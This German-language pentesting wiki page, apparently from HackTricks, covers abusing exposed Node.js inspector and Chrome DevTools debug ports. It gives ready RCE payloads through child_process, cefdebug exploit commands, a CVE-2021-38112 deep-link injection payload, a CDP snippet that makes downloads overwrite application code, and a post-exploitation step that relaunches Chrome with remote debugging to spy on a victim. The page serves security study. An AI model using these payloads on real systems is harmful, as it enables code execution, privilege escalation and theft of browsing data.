# Missbrauch von Node inspector/CEF debug

Historische praktische Beispiele umfassen den Multimaster-Walkthrough und den CVE-2019-1414-Visual-Studio-Code-debugger-Angriff; verwende sie als versionsspezifischen Kontext, statt anzunehmen, dass jedes aktuelle Electron- oder Chromium-Ziel dieselben Primitives bereitstellt.<sup>[[1]](#references)[[3]](#references)</sup>

## Grundlegende Informationen

[Aus der Dokumentation](https://nodejs.org/learn/getting-started/debugging): Beim Start mit dem Schalter `--inspect` wartet ein Node.js-Prozess auf einen Debugging-Client. **Standardmäßig** wartet er auf dem Host und Port **`127.0.0.1:9229`**. Jedem Prozess wird außerdem eine **eindeutige** **UUID** zugewiesen.<sup>[[4]](#references)</sup>

Inspector-Clients müssen Host-Adresse, Port und UUID kennen und angeben, um eine Verbindung herzustellen. Eine vollständige URL sieht etwa so aus: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Da der **Debugger vollständigen Zugriff auf die Node.js-Ausführungsumgebung hat**, kann ein Angreifer, der eine Verbindung zu diesem Port herstellen kann, möglicherweise beliebigen Code im Namen des Node.js-Prozesses ausführen (**potenzielle Privilege Escalation**).<sup>[[4]](#references)</sup>

Es gibt mehrere Möglichkeiten, einen Inspector zu starten:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wenn du einen überwachten Prozess startest, erscheint etwa Folgendes:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Auf **CEF** (**Chromium Embedded Framework**) basierende Prozesse können mit `--remote-debugging-port=9222` einen Debugger bereitstellen. Dadurch wird der Browser über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) und nicht über einen Node.js-Inspector verfügbar gemacht, weshalb Node.js-`process`-basierte Payloads standardmäßig nicht direkt anwendbar sind.<sup>[[2]](#references)[[5]](#references)</sup>

Wenn du einen Browser mit aktiviertem Debugging startest, wird etwa Folgendes angezeigt:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browser, WebSockets und same-origin-policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites, die in einem Webbrowser geöffnet werden, können WebSocket- und HTTP-Anfragen unter dem Browser-Sicherheitsmodell stellen. Eine **initiale HTTP-Verbindung** ist erforderlich, um eine **eindeutige Debugger-Sitzungs-ID zu erhalten**. Die **same-origin-policy** **verhindert**, dass Websites **diese HTTP-Verbindung** herstellen können. Als zusätzliche Sicherheitsmaßnahme gegen [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** überprüft Node.js, dass die **„Host“-Header** der Verbindung entweder eine **IP-Adresse** oder exakt **`localhost`** angeben.<sup>[[4]](#references)</sup>

> [!TIP]
> Diese **Sicherheitsmaßnahmen verhindern, den Inspector auszunutzen**, um Code auszuführen, indem **lediglich eine HTTP-Anfrage gesendet wird** (was durch das Ausnutzen einer SSRF vuln möglich wäre).<sup>[[4]](#references)</sup>

### Inspector in laufenden Prozessen starten

Du kannst das **Signal SIGUSR1** an einen laufenden nodejs-Prozess senden, damit dieser den **Inspector** am Standardport **startet**. Beachte jedoch, dass du über ausreichende Berechtigungen verfügen musst. Dadurch erhältst du möglicherweise **privilegierten Zugriff auf Informationen innerhalb des Prozesses**, jedoch keine direkte Privilege Escalation.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Dies ist in Containern nützlich, da das **Herunterfahren des Prozesses und Starten eines neuen** mit `--inspect` **keine Option** ist, weil der **Container** zusammen mit dem Prozess **beendet** wird.<sup>[[6]](#references)</sup>

### Mit Inspector/Debugger verbinden

Um eine Verbindung zu einem **Chromium-basierten Browser** herzustellen, können die URLs `chrome://inspect` oder `edge://inspect` für Chrome bzw. Edge aufgerufen werden. Durch Klicken auf die Schaltfläche „Configure“ sollte sichergestellt werden, dass der **Zielhost und -port** korrekt aufgeführt sind. Das Bild zeigt ein Remote Code Execution (RCE)-Beispiel:<sup>[[2]](#references)[[4]](#references)</sup>

![Nachdem eine URL für den Zugriff auf den Debugger verfügbar ist, wird sie angezeigt, z. B. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d – Mit Inspector/Debugger verbinden: Um eine Verbindung zu einem Chromium-basierten Browser herzustellen, ...](<../../images/image (674).png>)

Über die **Kommandozeile** können Sie eine Verbindung zu einem Debugger/Inspector herstellen mit:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Das Tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) ermöglicht es, lokal laufende **Inspector** zu **finden** und **Code zu injizieren**.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Beachten Sie, dass **NodeJS RCE-Exploits nicht funktionieren**, wenn eine Verbindung zu einem Browser über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) besteht (Sie müssen die API prüfen, um interessante Einsatzmöglichkeiten zu finden).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE im NodeJS-Debugger/Inspector

> [!TIP]
> Wenn Sie hierher gekommen sind, um herauszufinden, wie Sie [**RCE durch ein XSS in Electron erhalten, sehen Sie sich bitte diese Seite an.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Einige gängige Möglichkeiten, **RCE** zu erlangen, wenn Sie eine **Verbindung** zu einem Node-**Inspector** herstellen können, verwenden etwas wie (es sieht so aus, als würde dies bei einer Verbindung zum Chrome DevTools Protocol **nicht funktionieren**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Du kannst die API hier einsehen: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
In diesem Abschnitt liste ich lediglich interessante Dinge auf, von denen ich herausgefunden habe, dass sie von Personen zum Ausnutzen dieses Protokolls verwendet wurden.

### Parameter Injection via Deep Links

In [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) entdeckte Rhino Security, dass eine auf CEF basierende Anwendung eine benutzerdefinierte UR**I im System (workspaces://index.html) registrierte, die die vollständige URI erhielt und anschließend die CEF-basierte Applicatio**n mit einer Konfiguration startete, die teilweise aus dieser URI erstellt wurde.<sup>[[8]](#references)</sup>

Es wurde entdeckt, dass die URI-Parameter URL-decoded und zum Starten der CEF-Basisanwendung verwendet wurden, wodurch ein Benutzer das Flag **`--gpu-launcher`** in die **command line** **injecten** und beliebige Dinge ausführen konnte.<sup>[[8]](#references)</sup>

Daher sieht ein Payload folgendermaßen aus:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Wird calc.exe ausführen.<sup>[[8]](#references)</sup>

### Dateien überschreiben

Ändere den Ordner, in dem **heruntergeladene Dateien gespeichert werden**, und lade eine Datei herunter, um häufig verwendeten **Quellcode** der Anwendung mit deinem **Schadcode** zu **überschreiben**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE und Exfiltration

STAR Labs zeigte, dass exponierte WebDriver/CDP-Dienste beliebige Dateilesevorgänge und RCE ermöglichen können; DNS rebinding kann die Exploit chain in einigen Konfigurationen vervollständigen.<sup>[[9]](#references)</sup>

Für weitere historische Fälle zu Browser-Automation und Chromium-Sicherheit siehe den Counter-WebDriver-Bericht sowie die Project-Zero-Issues 773, 1742 und 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

In einer realen Umgebung und **nach der Kompromittierung** eines Benutzer-PCs, auf dem ein Chrome-/Chromium-basierter Browser verwendet wird, könntest du einen Chrome-Prozess mit **aktiviertem Debugging starten und den Debugging-Port weiterleiten**, sodass du darauf zugreifen kannst. Auf diese Weise kannst du **alles untersuchen, was das Opfer mit Chrome tut, und sensible Informationen stehlen**.<sup>[[7]](#references)</sup>

Die unauffällige Vorgehensweise besteht darin, **jeden Chrome-Prozess zu beenden** und anschließend etwas wie Folgendes aufzurufen:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Tool zur Inspektion und Exploitation des CEF/Chromium-Debuggers](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution in Visual Studio Code über den Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Erste Schritte](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Die Debugging-Funktion von Chrome missbrauchen, um Browsing-Sitzungen aus der Ferne zu beobachten und zu steuern](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Sprichst du mit mir? - WebDriver RCE über DNS Rebinding und CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Vom Bot zu RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium-Bugtracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium-Bugtracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium-Bugtracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
